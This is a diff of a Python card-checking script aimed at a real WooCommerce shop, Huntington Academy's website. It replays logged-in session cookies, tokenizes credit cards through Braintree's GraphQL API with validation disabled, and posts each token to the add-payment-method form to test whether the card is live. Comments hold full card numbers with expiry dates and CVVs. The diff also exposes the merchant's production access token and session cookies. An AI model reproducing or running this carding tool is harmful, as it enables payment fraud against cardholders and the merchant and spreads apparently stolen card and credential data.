@@ -32,29 +32,26 @@ modcajsilost%7C1719153886%7C7oqd3s1ky2N0jeyL24nF8JJB4SwelvHnlNj8Xy7coOM%7Cf40b52
 	with open('fileb3.txt', 'w') as file:
 		file.write(big)
 	cookies = {
-	    '_ga': 'GA1.1.1780262708.1717177773',
-	    '_gcl_au': '1.1.1201662495.1717177773',
+	    '_ga': 'GA1.1.774315979.1711878714',
+	    '_gcl_au': '1.1.169795609.1711878714',
 	    'wordpress_logged_in_262b7659d399c680c1ad181f217b3f4d': big,
-	    'wfwaf-authcookie-8288059899a58842f2727962646eba72': '5259%7Cother%7Cread%7Cbb9d6eeff02165187d4781e9c5bcf91f9ee79e14f125503e2adc2c34863d304e',
-	    '_ga_J890L8ECJX': 'GS1.1.1717779434.3.1.1717779618.60.0.0',
+	    'wfwaf-authcookie-8288059899a58842f2727962646eba72': '2451%7Cother%7Cread%7C61ed8c290d2bf7186e5b6f5cec774f0c6c1594b849562370e6447a4b8b83ccf7',
+	    '_ga_J890L8ECJX': 'GS1.1.1711878714.1.1.1711878997.57.0.0',
 	}
 	
 	headers = {
 	    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-	    'Accept-Language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
-	    'Cache-Control': 'max-age=0',
+	    'Accept-Language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
 	    'Connection': 'keep-alive',
-	    'Content-Type': 'application/x-www-form-urlencoded',
-	    # 'Cookie': '_ga=GA1.1.1780262708.1717177773; _gcl_au=1.1.1201662495.1717177773; wordpress_logged_in_262b7659d399c680c1ad181f217b3f4d=ididudud%7C1718387387%7CL8tz3iA1bxEqTxCNi3dh0CbrzjUQqW7zi2NvMAtmFP3%7Cd11ff6c87613d2e4c909e30b81ac62ec8e964cdb049019377b57379e0b9fa6ab; wfwaf-authcookie-8288059899a58842f2727962646eba72=5259%7Cother%7Cread%7Cbb9d6eeff02165187d4781e9c5bcf91f9ee79e14f125503e2adc2c34863d304e; _ga_J890L8ECJX=GS1.1.1717779434.3.1.1717779618.60.0.0',
-	    'Origin': 'https://www.huntingtonacademy.com',
-	    'Referer': 'https://www.huntingtonacademy.com/my-account/add-payment-method/',
+	    # 'Cookie': '_ga=GA1.1.774315979.1711878714; _gcl_au=1.1.169795609.1711878714; wordpress_logged_in_262b7659d399c680c1ad181f217b3f4d=visaspam77%7C1713088332%7Co1IP7tiJpkipfh2yKngvFR4oLuT02D2yLAOwRwGqmDb%7C56bf1ba7db092a0773b738a06eb7fa15b4ffd017038a897c08ef6a9a94812ab2; wfwaf-authcookie-8288059899a58842f2727962646eba72=2451%7Cother%7Cread%7C61ed8c290d2bf7186e5b6f5cec774f0c6c1594b849562370e6447a4b8b83ccf7; _ga_J890L8ECJX=GS1.1.1711878714.1.1.1711878997.57.0.0',
+	    'Referer': 'https://www.huntingtonacademy.com/my-account/payment-methods/',
 	    'Sec-Fetch-Dest': 'document',
 	    'Sec-Fetch-Mode': 'navigate',
 	    'Sec-Fetch-Site': 'same-origin',
 	    'Sec-Fetch-User': '?1',
 	    'Upgrade-Insecure-Requests': '1',
-	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
-	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
+	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
 	    'sec-ch-ua-mobile': '?1',
 	    'sec-ch-ua-platform': '"Android"',
 	}
@@ -67,26 +64,26 @@ modcajsilost%7C1719153886%7C7oqd3s1ky2N0jeyL24nF8JJB4SwelvHnlNj8Xy7coOM%7Cf40b52
 	headers = {
 	    'authority': 'payments.braintree-api.com',
 	    'accept': '*/*',
-	    'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
+	    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
 	    'authorization': f'Bearer {au}',
 	    'braintree-version': '2018-05-10',
 	    'content-type': 'application/json',
 	    'origin': 'https://assets.braintreegateway.com',
 	    'referer': 'https://assets.braintreegateway.com/',
-	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
 	    'sec-ch-ua-mobile': '?1',
 	    'sec-ch-ua-platform': '"Android"',
 	    'sec-fetch-dest': 'empty',
 	    'sec-fetch-mode': 'cors',
 	    'sec-fetch-site': 'cross-site',
-	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
 	}
 	
 	json_data = {
 	    'clientSdkMetadata': {
 	        'source': 'client',
 	        'integration': 'custom',
-	        'sessionId': 'f566c990-a428-4c19-b46a-45591316cad7',
+	        'sessionId': '698e6aaa-6b50-4bf0-adc4-d454c57ef68a',
 	    },
 	    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
 	    'variables': {
@@ -97,8 +94,8 @@ modcajsilost%7C1719153886%7C7oqd3s1ky2N0jeyL24nF8JJB4SwelvHnlNj8Xy7coOM%7Cf40b52
 	                'expirationYear': yy,
 	                'cvv': cvc,
 	                'billingAddress': {
-	                    'postalCode': '10090',
-	                    'streetAddress': 'New york',
+	                    'postalCode': '11743',
+	                    'streetAddress': '',
 	                },
 	            },
 	            'options': {
@@ -110,29 +107,29 @@ modcajsilost%7C1719153886%7C7oqd3s1ky2N0jeyL24nF8JJB4SwelvHnlNj8Xy7coOM%7Cf40b52
 	}
 	
 	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
-	tok = response.json()['data']['tokenizeCreditCard']['token']	
+	tok = response.json()['data']['tokenizeCreditCard']['token']
+	
 	# Note: json_data will not be serialized by requests
 	# exactly as it was in the original request.
-	#data = '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"2a71d842-464d-4e84-ae94-ba076412c744"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"4519932120833231","expirationMonth":"02","expirationYear":"2027","cvv":"924","billingAddress":{"postalCode":"10090","streetAddress":"New york"}},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}'
+	#data = '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"698e6aaa-6b50-4bf0-adc4-d454c57ef68a"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"4304512200105020","expirationMonth":"10","expirationYear":"2028","cvv":"323","billingAddress":{"postalCode":"11743","streetAddress":""}},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}'
 	#response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, data=data)
 	import requests
 	
 	cookies = {
-	    '_ga': 'GA1.1.1780262708.1717177773',
-	    '_gcl_au': '1.1.1201662495.1717177773',
-	    'wordpress_test_cookie': 'WP%20Cookie%20check',
+	    '_ga': 'GA1.1.774315979.1711878714',
+	    '_gcl_au': '1.1.169795609.1711878714',
 	    'wordpress_logged_in_262b7659d399c680c1ad181f217b3f4d': big,
-	    'wfwaf-authcookie-8288059899a58842f2727962646eba72': '5422%7Cother%7Cread%7Ca1b3c8b624a27aea365ef66cc5259fca1da5d2426e830e128e1f8ba5c1ac47cf',
-	    '_ga_J890L8ECJX': 'GS1.1.1717942063.10.1.1717943893.35.0.0',
+	    'wfwaf-authcookie-8288059899a58842f2727962646eba72': '2451%7Cother%7Cread%7C61ed8c290d2bf7186e5b6f5cec774f0c6c1594b849562370e6447a4b8b83ccf7',
+	    '_ga_J890L8ECJX': 'GS1.1.1711878714.1.1.1711878764.10.0.0',
 	}
 	
 	headers = {
 	    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-	    'Accept-Language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
+	    'Accept-Language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
 	    'Cache-Control': 'max-age=0',
 	    'Connection': 'keep-alive',
 	    'Content-Type': 'application/x-www-form-urlencoded',
-	    # 'Cookie': '_ga=GA1.1.1780262708.1717177773; _gcl_au=1.1.1201662495.1717177773; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_262b7659d399c680c1ad181f217b3f4d=fmost257111%7C1719153346%7CUbTltlMB4KXCsYfIghjeQauzQPLuNyg9OitGq7pWkvL%7C6e3d00621737a129c82c3da198e2cee7d982b4a41b206631816cc99b9a5c0d96; wfwaf-authcookie-8288059899a58842f2727962646eba72=5422%7Cother%7Cread%7Ca1b3c8b624a27aea365ef66cc5259fca1da5d2426e830e128e1f8ba5c1ac47cf; _ga_J890L8ECJX=GS1.1.1717942063.10.1.1717943893.35.0.0',
+	    # 'Cookie': '_ga=GA1.1.774315979.1711878714; _gcl_au=1.1.169795609.1711878714; wordpress_logged_in_262b7659d399c680c1ad181f217b3f4d=visaspam77%7C1713088332%7Co1IP7tiJpkipfh2yKngvFR4oLuT02D2yLAOwRwGqmDb%7C56bf1ba7db092a0773b738a06eb7fa15b4ffd017038a897c08ef6a9a94812ab2; wfwaf-authcookie-8288059899a58842f2727962646eba72=2451%7Cother%7Cread%7C61ed8c290d2bf7186e5b6f5cec774f0c6c1594b849562370e6447a4b8b83ccf7; _ga_J890L8ECJX=GS1.1.1711878714.1.1.1711878764.10.0.0',
 	    'Origin': 'https://www.huntingtonacademy.com',
 	    'Referer': 'https://www.huntingtonacademy.com/my-account/add-payment-method/',
 	    'Sec-Fetch-Dest': 'document',
@@ -140,8 +137,8 @@ modcajsilost%7C1719153886%7C7oqd3s1ky2N0jeyL24nF8JJB4SwelvHnlNj8Xy7coOM%7Cf40b52
 	    'Sec-Fetch-Site': 'same-origin',
 	    'Sec-Fetch-User': '?1',
 	    'Upgrade-Insecure-Requests': '1',
-	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
-	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
+	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
 	    'sec-ch-ua-mobile': '?1',
 	    'sec-ch-ua-platform': '"Android"',
 	}
@@ -149,10 +146,10 @@ modcajsilost%7C1719153886%7C7oqd3s1ky2N0jeyL24nF8JJB4SwelvHnlNj8Xy7coOM%7Cf40b52
 	data = {
 	    'payment_method': 'braintree_cc',
 	    'braintree_cc_nonce_key': tok,
-	    'braintree_cc_device_data': '{"device_session_id":"1620e3e388a28a1c1c3b5ee811bf381d","fraud_merchant_id":null,"correlation_id":"e6963abede490e99abbbedb55ecf4b0d"}',
+	    'braintree_cc_device_data': '{"device_session_id":"d5e97ccc9f799eb2267d322e412447c7","fraud_merchant_id":null,"correlation_id":"337df1cb3591edc6154038e002f7aa88"}',
 	    'braintree_cc_3ds_nonce_key': '',
-	    'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/88yh4wp5qmm383vy/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/88yh4wp5qmm383vy"},"merchantId":"88yh4wp5qmm383vy","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"kount":{"kountMerchantId":null},"challenges":["cvv","postal_code"],"creditCards":{"supportedCardTypes":["MasterCard","Visa","Discover","JCB","American Express","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"payWithVenmo":{"merchantId":"3184501200456253861","accessToken":"access_token$production$88yh4wp5qmm383vy$046fed997ac2817cff08e18b6195f802","environment":"production"},"paypalEnabled":true,"paypal":{"displayName":"Huntington Academy of Permanent Cosmetics","clientId":"AVSrt_PxsQbUo8i9Vf3OcqThKuBqMkQGg-hRLlnTHO9r55agBf5KosAkmqFdhrjvnX-iVNe6p3miaPmP","privacyUrl":null,"userAgreementUrl":null,"assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"huntingtonacademyofpermanentcosmetics_instant","payeeEmail":null,"currencyIsoCode":"USD"}}',
-	    'woocommerce-add-payment-method-nonce': '704d840d63',
+	    'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/88yh4wp5qmm383vy/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/88yh4wp5qmm383vy"},"merchantId":"88yh4wp5qmm383vy","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"kount":{"kountMerchantId":null},"challenges":["cvv","postal_code"],"creditCards":{"supportedCardTypes":["Discover","JCB","MasterCard","Visa","American Express","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"payWithVenmo":{"merchantId":"3184501200456253861","accessToken":"access_token$production$88yh4wp5qmm383vy$046fed997ac2817cff08e18b6195f802","environment":"production"},"paypalEnabled":true,"paypal":{"displayName":"Huntington Academy of Permanent Cosmetics","clientId":"AVSrt_PxsQbUo8i9Vf3OcqThKuBqMkQGg-hRLlnTHO9r55agBf5KosAkmqFdhrjvnX-iVNe6p3miaPmP","privacyUrl":null,"userAgreementUrl":null,"assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"huntingtonacademyofpermanentcosmetics_instant","payeeEmail":null,"currencyIsoCode":"USD"}}',
+	    'woocommerce-add-payment-method-nonce': add_nonce,
 	    '_wp_http_referer': '/my-account/add-payment-method/',
 	    'woocommerce_add_payment_method': '1',
 	}
